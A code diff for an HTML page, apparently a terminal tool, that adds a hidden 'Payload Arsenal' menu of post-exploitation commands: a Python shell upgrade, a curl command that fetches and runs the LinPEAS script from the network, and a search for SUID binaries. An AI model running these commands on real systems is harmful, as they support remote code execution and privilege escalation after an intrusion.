@@ -10,6 +10,14 @@
   <body>
     <div id="app-container">
       <div id="terminal-container"></div>
+      <div id="payload-drawer" class="hidden">
+        <h3>Payload Arsenal</h3>
+        <ul>
+          <li data-payload="python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'">Python TTY Upgrade</li>
+          <li data-payload="curl -L http://linpeas.sh | sh">LinPEAS</li>
+          <li data-payload="find / -perm -u=s -type f 2>/dev/null">Find SUID Binaries</li>
+        </ul>
+      </div>
     </div>
   </body>
 </html>
